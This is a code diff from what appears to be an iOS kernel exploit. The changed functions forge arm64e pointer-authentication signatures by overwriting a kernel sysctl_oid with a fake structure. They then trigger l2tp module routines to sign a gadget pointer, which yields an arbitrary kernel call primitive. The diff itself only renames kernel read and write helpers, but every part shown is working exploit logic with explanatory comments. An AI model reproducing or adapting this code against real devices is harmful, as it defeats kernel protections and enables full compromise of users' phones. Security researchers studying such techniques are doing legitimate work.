@@ -59,14 +59,14 @@ stage1_init_kernel_pacxa_forging() {
     // Get the authorized pointers to l2tp_domain_module_start() and l2tp_domain_module_stop().
     // Because these values already contain the PACIZA code, we can call them with the stage 0
     // call primitive to start/stop the module.
-    uint64_t paciza__l2tp_domain_module_start = kernel_read64(
+    uint64_t paciza__l2tp_domain_module_start = kernel_read64_internal(
                                                               ADDRESS(paciza_pointer__l2tp_domain_module_start));
-    uint64_t paciza__l2tp_domain_module_stop = kernel_read64(
+    uint64_t paciza__l2tp_domain_module_stop = kernel_read64_internal(
                                                              ADDRESS(paciza_pointer__l2tp_domain_module_stop));
     
     // Read out the original value of sysctl__net_ppp_l2tp__data.
     uint8_t sysctl__net_ppp_l2tp__data[SIZE(sysctl_oid)];
-    kernel_read(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
+    kernel_read_internal(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
     
     // Create a fake sysctl_oid for sysctl_unregister_oid(). We craft this sysctl_oid such that
     // sysctl_unregister_oid() will execute the following instruction sequence:
@@ -91,7 +91,7 @@ stage1_init_kernel_pacxa_forging() {
     FIELD(fake_sysctl_oid, sysctl_oid, oid_refcnt,  uint32_t) = 0;
     
     // Overwrite sysctl__net_ppp_l2tp with our fake sysctl_oid.
-    kernel_write(ADDRESS(sysctl__net_ppp_l2tp), fake_sysctl_oid, SIZE(sysctl_oid));
+    kernel_write_internal(ADDRESS(sysctl__net_ppp_l2tp), fake_sysctl_oid, SIZE(sysctl_oid));
     
     // Call l2tp_domain_module_stop() to trigger sysctl_unregister_oid() on our fake
     // sysctl_oid, which will PACIZA our pointer to the "mov x0, x4 ; br x5" gadget.
@@ -101,18 +101,18 @@ stage1_init_kernel_pacxa_forging() {
                                0, 0, 0, 0, 0, 0);            // X1 - X6
     DEBUG_TRACE(1, "%s(): 0x%08x; l2tp_domain_inited = %d",
                 "l2tp_domain_module_stop", ret,
-                kernel_read32(ADDRESS(l2tp_domain_inited)));
+                kernel_read32_internal(ADDRESS(l2tp_domain_inited)));
     
     // Read back the PACIZA'd pointer to the 'mov x0, x4 ; br x5' gadget. This pointer will not
     // be exactly correct, since it PACIZA'd an AUTIA'd pointer we didn't sign. But we can use
     // this value to reconstruct the correct PACIZA'd pointer.
-    uint64_t handler = kernel_read64(
+    uint64_t handler = kernel_read64_internal(
                                      ADDRESS(sysctl__net_ppp_l2tp) + OFFSET(sysctl_oid, oid_handler));
     paciza__mov_x0_x4__br_x5 = handler ^ (1uLL << (63 - 1));
     DEBUG_TRACE(1, "PACIZA(%s) = 0x%016llx", "'mov x0, x4 ; br x5'", paciza__mov_x0_x4__br_x5);
     
     // Now write back the original sysctl_oid and call sysctl_unregister_oid() to clean it up.
-    kernel_write(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
+    kernel_write_internal(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
     ret = stage1_kernel_call_7(
                                paciza__mov_x0_x4__br_x5,    // PC
                                0, 0, 0,            // X1 - X3
@@ -128,7 +128,7 @@ stage1_init_kernel_pacxa_forging() {
                                0, 0, 0, 0, 0, 0);            // X1 - X6
     DEBUG_TRACE(1, "%s(): 0x%08x; l2tp_domain_inited = %d",
                 "l2tp_domain_module_start", ret,
-                kernel_read32(ADDRESS(l2tp_domain_inited)));
+                kernel_read32_internal(ADDRESS(l2tp_domain_inited)));
     
     // Alright, so now we have an arbitrary call gadget!
     kernel_pacxa_buffer = stage1_get_kernel_buffer();
@@ -149,7 +149,7 @@ stage2_kernel_forge_pacxa(uint64_t address, uint64_t context, bool instruction) 
     // Initialize the kernel_pacxa_buffer to be all zeros.
     uint8_t pacxa_buffer[pacxa_buffer_size - pacxa_buffer_offset];
     memset(pacxa_buffer, 0, sizeof(pacxa_buffer));
-    kernel_write(kernel_pacxa_buffer, pacxa_buffer, sizeof(pacxa_buffer));
+    kernel_write_internal(kernel_pacxa_buffer, pacxa_buffer, sizeof(pacxa_buffer));
     // The buffer address we pass to the gadget is offset from the part of that we initialize
     // (to save us some space). The result is stored at different offsets in the buffer
     // depending on whether the operation is PACIA or PACDA.
@@ -187,7 +187,7 @@ stage2_kernel_forge_pacxa(uint64_t address, uint64_t context, bool instruction) 
                                pacxa_gadget);            // X6
     DEBUG_TRACE(2, "%s_GADGET(): 0x%08x", (instruction ? "PACIA" : "PACDA"), ret);
     // Now recover the PACXA'd value.
-    uint64_t pacxa = kernel_read64(result_address);
+    uint64_t pacxa = kernel_read64_internal(result_address);
     return pacxa;
 }
 
